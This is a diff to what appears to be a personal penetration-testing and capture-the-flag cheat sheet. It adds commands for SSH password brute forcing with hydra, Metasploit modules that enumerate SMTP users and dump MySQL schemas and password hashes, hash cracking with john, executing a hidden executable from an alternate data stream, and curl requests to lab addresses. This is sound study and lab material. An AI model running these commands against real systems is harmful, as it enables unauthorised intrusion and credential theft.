@@ -215,8 +215,8 @@
 - `stty raw -echo`
 - Then foreground
 
-## SSH
-- `hydra -L users.txt -P passwords.txt ssh://10.10.10.7`
+## SSH Brute Force
+- `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.3.11 ssh`
 
 ### decrypt encrypted RSA/SSH key
 - `ssh2john filename > newfilename`
@@ -333,10 +333,30 @@ Some other important instructions:
 
 ### SMTP
 - Enumerate with Metasploit: `auxiliary/scanner/smtp/smtp_version`
+- Also: `auxiliary/scanner/smtp/smtp_enum`
 - Useful tool without using Metasploit: `smtp-user-enum`
+
+### MySQL
+- connect: `mysql -h [IP] -u [username] -p`
+- enumerate with Metasploit: `auxiliary/admin/mysql/mysql_sql`
+- dump databases and tables: `auxiliary/scanner/mysql/mysql_schemadump`
+- dump (password) hashes: `auxiliary/scanner/mysql/mysql_hashdump`
+- enumerate manually: `https://nmap.org/nsedoc/scripts/mysql-enum.html`
+- enumerate manually: `https://www.exploit-db.com/exploits/23081`
 
 ### Alternate Data Stream (hide .exe in .exe)
 - scan malicious EXE in Powershell: `c:\Tools\strings64.exe -accepteula file.exe`
 - `-Stream` in the output can relate to ADS
 - view ADS using Powershell: `Get-Item -Path file.exe -Stream *`
 - execute hidden EXE stream: `wmic process call create $(Resolve-Path file.exe:streamname)`
+
+### Additional Kali downloads
+- Download useful lists from Seclists: `sudo apt install seclists`
+
+### Decrypting hashes
+- `john hash.txt`
+
+### cURL
+- get request: `curl http://10.10.171.117:8081/ctf/get`
+- post request with data in body: `curl -X POST --data "flag_please" http://10.10.171.117:8081/ctf/post`
+- post request with headers: `curl -X POST -F 'name=linuxize' -F 'email=linuxize@example.com' https://example.com/contact.php`
